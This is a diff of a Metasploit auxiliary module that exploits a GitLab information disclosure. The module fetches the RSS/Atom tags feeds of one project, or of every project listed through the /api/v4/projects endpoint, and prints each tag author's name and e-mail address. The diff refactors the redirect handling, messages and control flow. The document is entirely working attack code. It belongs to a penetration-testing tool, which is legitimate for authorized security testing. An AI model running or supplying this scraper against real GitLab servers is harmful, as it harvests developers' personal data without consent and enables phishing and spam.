@@ -45,71 +45,80 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_contents(tags)
-    print_status('Check RSS tags feed for: ' + tags)
+    vprint_status('Check RSS tags feed for: ' + tags)
 
     # Tag needs to be lower case, so...
-    tags = tags.split('/')[0] + '/' + tags.split('/')[1].downcase
+    tags = "#{tags.split('/')[0]}/#{tags.split('/')[1].downcase}"
 
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, tags, '-', 'tags'),
       'method' => 'GET', 'vars_get' => { 'format' => 'atom' }
     )
 
-    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") unless res.code == 200 || res.code == 301
+    if res.code == 200
+      xml_res = res.get_xml_document
 
-    xml_res = res.get_xml_document
+    # If we receive a 301 it's probably an issue with workspace case-insensitivty
+    elsif res.code == 301 && res['location']
+      new_uri = URI.parse(res['location']).path
+      res = send_request_cgi(
+        'uri' => normalize_uri(new_uri.to_s),
+        'method' => 'GET', 'vars_get' => { 'format' => 'atom' }
+      )
+      xml_res = res.get_xml_document
+
+      # Error out with an unreachable or any other error code
+    else
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
+      fail_with(Failure::UnexpectedReply, "#{peer} - Project does not exist or is not public (response code: #{res.code})")
+    end
 
     # Check to see if there are any tags with authors
     author_element = 'author'
     not_found = xml_res.xpath("//xmlns:#{author_element}").empty?
     if not_found
-      print_bad('No tags or authors found')
-    else
-      loot_path = store_loot('gitlab.RSS.info_disclosure', 'application/xml', datastore['RHOST'], xml_res, 'tag_author_info.xml')
-      print_good("Output saved to #{loot_path}")
+      vprint_bad('No tags or authors found')
+      return
+    end
 
-      # Initialze an empty set so we can dedupe authors based on email address
-      # This only dedupes within a project, not the entirety of Gitlab,
-      # so forks of projects may show duplicate email addresses.
-      unique_emails = Set.new
+    # Initialze an empty set so we can dedupe authors based on email address
+    # This only dedupes within a project, not the entirety of Gitlab,
+    # so forks of projects may show duplicate email addresses.
+    unique_emails = Set.new
 
-      xml_res.xpath('//xmlns:author').each do |authors|
-        email = authors.at_xpath('xmlns:email').text
-        next if unique_emails.include?(email)
+    xml_res.xpath('//xmlns:author').each do |authors|
+      email = authors.at_xpath('xmlns:email').text
+      next if unique_emails.include?(email)
 
-        name = authors.at_xpath('xmlns:name').text
-        print_good("name: #{name}")
-        print_good("e-mail: #{email}")
-        unique_emails << email
-      end
+      name = authors.at_xpath('xmlns:name').text
+      print_good("name: #{name}")
+      print_good("e-mail: #{email}")
+      unique_emails << email
     end
   end
 
   def run
-    if datastore['TARGETPROJECT'].nil?
-      print_good('Scraping ALL projects...')
-      request = {
-        'uri' => normalize_uri(target_uri.path, '/api/v4/projects'),
-        'method' => 'GET', 'vars_get' => {
-          'output_mode' => 'json'
-        }
-      }
-
-      res = send_request_cgi(request)
-
-      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") unless res.code == 200
-
-      res.get_json_document.each do |entry|
-        tags = entry['path_with_namespace']
-        get_contents(tags)
-      end
-
-    else
+    unless datastore['TARGETPROJECT'].nil?
       get_contents(datastore['TARGETPROJECT'].to_s)
+      return
     end
-  rescue ::Rex::ConnectionError
-    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+
+    print_good('Scraping ALL projects...')
+    request = {
+      'uri' => normalize_uri(target_uri.path, '/api/v4/projects'),
+      'method' => 'GET', 'vars_get' => {
+        'output_mode' => 'json'
+      }
+    }
+
+    res = send_request_cgi(request)
+
+    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
+    fail_with(Failure::UnexpectedReply, "#{peer} - Project list API endpoint unavailable (response code: #{res.code})") unless res.code == 200
+
+    res.get_json_document.each do |entry|
+      tags = entry['path_with_namespace']
+      get_contents(tags)
+    end
   end
 end
